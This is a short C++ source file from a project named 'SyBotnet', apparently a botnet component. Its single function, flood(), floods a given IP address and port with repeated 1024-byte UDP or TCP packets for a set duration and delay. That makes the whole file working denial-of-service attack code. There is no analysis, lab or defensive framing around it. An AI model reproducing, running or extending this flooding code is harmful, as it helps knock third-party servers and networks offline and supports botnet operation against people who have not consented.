/* =============================================== */
/* |  Name: SyBotnet --------------------------- | */
/* |  Decription: Using SyOKet Library           | */
/* |  Copyright: Copyright 2021 SeungYup26       | */
/* |  Github: SeungYup - @SeungYup26             | */
/* =============================================== */

#include"flood.h"

using namespace std::chrono;
using namespace std::chrono_literals;

void flood(Data data)
{
	if (strcmp(data.proto, "udp") == 0)
	{
		UDPSocket udp = UDPSocket(data.ip, data.port);

		time_point<system_clock> end = system_clock::now() + milliseconds(data.time);

		while (system_clock::now() < end) {
			udp.SendTo(const_cast<char*>(data.packet), 1024);
			std::this_thread::sleep_for(milliseconds(data.delay));
		}
	}
	else if (strcmp(data.proto, "tcp") == 0)
	{
		TCPSocket tcp = TCPSocket(data.ip, data.port);

		time_point<system_clock> end = system_clock::now() + milliseconds(data.time);

		while (system_clock::now() < end) {
			tcp.Send(const_cast<char*>(data.packet), 1024);
			std::this_thread::sleep_for(milliseconds(data.delay));
		}
	}
}